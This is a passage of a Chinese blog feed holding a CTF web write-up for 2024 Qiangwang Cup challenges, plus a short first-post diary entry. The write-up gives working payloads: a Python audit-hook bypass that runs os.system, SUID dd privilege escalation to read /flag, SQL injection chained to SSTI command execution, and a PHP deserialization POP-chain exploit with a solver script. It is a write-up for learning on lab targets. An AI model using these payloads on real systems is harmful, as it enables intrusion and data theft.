mod.data.index(target)))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> ImportError:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>第二步就是要绕过钩子函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_audit_hook</span>(<span class="hljs-params">event_name, arg</span>):<br>    blacklist = [<span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;input&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;compile&quot;</span>, <span class="hljs-string">&quot;memoryview&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(event_name) &gt; <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;Too Long!&quot;</span>)<br>    <span class="hljs-keyword">for</span> bad <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> bad <span class="hljs-keyword">in</span> event_name:<br>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;No!&quot;</span>)<br><br><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).addaudithook(my_audit_hook)<br></code></pre></td></tr></table></figure><p>这里执行os.system的时候会触发hook函数去检查这个事件的名字长度，这里可以通过重写len函数实现绕过</p><p>_<em>import</em>_ (“builtins”).len&#x3D;lambda x:0 这样无论怎么样len函数都返回0。</p><p>还要用 ’ 去闭合前面的引号和末尾的引号，并使用;隔开，避免报错。</p><p>最终payload如下：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">‘;＿＿builtins＿＿．<span class="hljs-built_in">len</span> ＝ lambda x： <span class="hljs-number">2</span>\n＿＿import＿＿（＂<span class="hljs-built_in">os</span>＂）．system（＂<span class="hljs-built_in">find</span> ／ －perm －u＝s －<span class="hljs-built_in">type</span> f <span class="hljs-number">2</span>＞／dev／null＂）;‘<br></code></pre></td></tr></table></figure><p>suid提权</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>发现dd命令具有suid权限</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=/flag <span class="hljs-attribute">of</span>=/dev/stdout<br></code></pre></td></tr></table></figure><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>这道题先要搓个自动化脚本通关游戏(看来做web还是要多练写脚本啊，不然连第一关都过不去bushi…）</p><p>然后给你一个路径</p><p><img src="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/image-20241105215802287.png" alt="image-20241105215802287"></p><p>测了⼀下发现有个sql注⼊，数据库是sqlite，只有⼀个users表，不好利⽤。然后⼜测出来有⼀个ssti，直接⽤ssti rce读flag</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">snake_win?username=asd%27%20union+select+1,2,&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[69][&quot;load_module&quot;](<span class="hljs-name">&quot;os&quot;</span>).popen(<span class="hljs-name">&quot;cat+/flag&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#x27;;--+</span><br></code></pre></td></tr></table></figure><h2 id="Password-Game"><a href="#Password-Game" class="headerlink" title="Password Game"></a>Password Game</h2><p>密码规则</p><ol><li><p>您不满足 Rule 1: 请至少包含数字和大小写字母</p></li><li><p>您不满足 Rule 2: 密码中所有数字之和必须为30的倍数（30是每次都会变的数字）</p></li><li><p>您不满足 Rule 3:请密码中包含下列算式的解(如有除法，则为整除): 20318 * 25</p></li><li><p>您不满足 Rule 4:密码长度不能超过170。</p><p>写脚本通过游戏</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>target = <span class="hljs-string">&quot;http://eci-2ze0pqgkgxajnn536v58.cloudeci1.ichunqiu.com/&quot;</span><br><br>session = requests.Session()<br><br>res = session.post(target + <span class="hljs-string">&quot;/index.php?action=start&quot;</span>, data=&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>&#125;)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_password</span>(<span class="hljs-params">password</span>):<br>    res = session.post(target + <span class="hljs-string">&quot;/game.php&quot;</span>, data=&#123;<span class="hljs-string">&quot;password&quot;</span>: password&#125;)<br>    <span class="hljs-keyword">return</span> res.text<br><br>result = submit_password(<span class="hljs-string">&quot;Aa1&quot;</span>)<br>last_line = result.split(<span class="hljs-string">&quot;\n&quot;</span>)[-<span class="hljs-number">1</span>]<br>倍数 = <span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">r&quot;\d+&quot;</span>, last_line)[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;倍数&quot;</span>, 倍数)<br><br>result = submit_password(<span class="hljs-string">&quot;Aa0&quot;</span>)<br>last_line = result.split(<span class="hljs-string">&quot;\n&quot;</span>)[-<span class="hljs-number">1</span>]<br>算式结果 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">eval</span>(last_line))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;算式结果&quot;</span>, 算式结果)<br>算式结果每一位加起来 = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">str</span>(算式结果)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;算式结果每一位加起来&quot;</span>, 算式结果每一位加起来)<br><span class="hljs-comment">#payload = &#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;O:5:&quot;guest&quot;:2:&#123;s:8:&quot;username&quot;;N;s:5:&quot;value&quot;;N;&#125;s:8:&quot;password&quot;;N;&#125;&#x27;</span><br>payload = <span class="hljs-string">r&#x27;O:4:&quot;root&quot;:2:&#123;s:8:&quot;username&quot;;O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;S:7:&quot;2024\71wb&quot;;s:8:&quot;password&quot;;N;s:5:&quot;value&quot;;N;&#125;s:5:&quot;value&quot;;R:3;&#125;&#x27;</span><br>payload_sum = <span class="hljs-built_in">sum</span>([<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">if</span> i.isdigit()])<br>now_num = 算式结果每一位加起来 + payload_sum<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;now_num&quot;</span>, now_num)<br>差的大概倍数 = <span class="hljs-built_in">int</span>(now_num / 倍数)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;差的大概倍数&quot;</span>, 差的大概倍数)<br><br>差的值 =  (倍数 * (差的大概倍数 + <span class="hljs-number">1</span>)) - 算式结果每一位加起来 - payload_sum<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;差的值：&quot;</span>, 差的值)<br><span class="hljs-keyword">assert</span> 差的值 &gt;= <span class="hljs-number">0</span>, <span class="hljs-string">&quot;懒得处理差的值小于0的情况了&quot;</span><br>添加的尾巴 = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span> 差的值 &gt;= <span class="hljs-number">10</span>:<br>    差的值 -= <span class="hljs-number">9</span><br>    添加的尾巴 += <span class="hljs-string">&quot;9&quot;</span><br>添加的尾巴 += <span class="hljs-built_in">str</span>(差的值)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;添加的尾巴&quot;</span>, 添加的尾巴)<br>password = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;payload&#125;</span><span class="hljs-subst">&#123;算式结果&#125;</span><span class="hljs-subst">&#123;添加的尾巴&#125;</span>&quot;</span><br>password_sum = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">ord</span>, password))<br><span class="hljs-built_in">print</span>(password)<br><span class="hljs-built_in">print</span>(password_sum)<br><br>result = submit_password(password)<br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><p>通关后得到如下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$password</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;2024qwb&quot;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&quot;nonono&quot;</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">guest</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username==<span class="hljs-string">&quot;guest&quot;</span>)&#123;<br>            <span class="hljs-variable">$value</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>]))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">root</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;value == <span class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;hello:&quot;</span>.<span class="hljs-variable">$this</span>-&gt;value);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;password-&gt;<span class="hljs-title function_ invoke__">guess</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> )&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;username;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$user</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$user</span>-&gt;password == <span class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>看上去有两条链子</p><p>第一条是最下面strpos($user-&gt;username, “admin”) &#x3D;&#x3D; 0，可以让$user-&gt;username等于一个guest对象，那这 里比较字符串就会触发__tostring()，然后 $value()可以触发user的 _<em>invoke()，然后可以触发guest的_<em>call</em></em></p><p>第二条就是$user-&gt;password &#x3D;&#x3D; “2024qwb”，可以让$user为root对象，去触发 __get，但这里要先满足 strpos($user-&gt;username, “admin”) &#x3D;&#x3D; 0这个判断。</p><p>其实第一条在$value()那里跑不通，正确的是$this-&gt;value()</p><p>这里可以使用<strong>引用绕过</strong>进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>] = <span class="hljs-string">&quot;flag&#123;test&#125;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$password</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;2024qwb&quot;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-variable">$password</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&quot;nonono&quot;</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">root</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;2024qwb&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;value == <span class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;root#get\n&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;hello:&quot;</span>.<span class="hljs-variable">$this</span>-&gt;value);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user#__invoke\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;password-&gt;<span class="hljs-title function_ invoke__">guess</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user#__destruct\n&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> )&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;username;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();<br><span class="hljs-variable">$root1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">root</span>();<br><span class="hljs-variable">$user1</span>-&gt;username = &amp;<span class="hljs-variable">$root1</span>-&gt;value;<br><span class="hljs-variable">$root1</span>-&gt;username = <span class="hljs-variable">$user1</span>;<br><span class="hljs-variable">$ser_data2</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$root1</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ser_data2</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$ser_data1</span> = <span class="hljs-string">&#x27;O:4:&quot;root&quot;:2:&#123;s:8:&quot;username&quot;;O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;S:7:&quot;2024\71wb&quot;;s:8:&quot;password&quot;;N;s:5:&quot;value&quot;;N;&#125;s:5:&quot;value&quot;;R:3;&#125;&#x27;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$ser_data1</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$user</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$user</span>-&gt;password == <span class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello!&quot;</span>;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="Playground"><a href="#Playground" class="headerlink" title="Playground"></a>Playground</h2><p>这是道关于Go语言的，有时间再复现</p><h2 id="Proxy-revenge"><a href="#Proxy-revenge" class="headerlink" title="Proxy_revenge"></a>Proxy_revenge</h2><p>这也是</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开启我的博客之旅</title>
    <link href="/2024/11/04/%E5%BC%80%E5%90%AF%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%B9%8B%E6%97%85/"/>
    <url>/2024/11/04/%E5%BC%80%E5%90%AF%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%B9%8B%E6%97%85/</url>
    
    <content type="html"><![CDATA[<p>就在这一天！我搭建起了自己的博客!希望以后养成记录知识和生活的好习惯 Come on！</p><span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
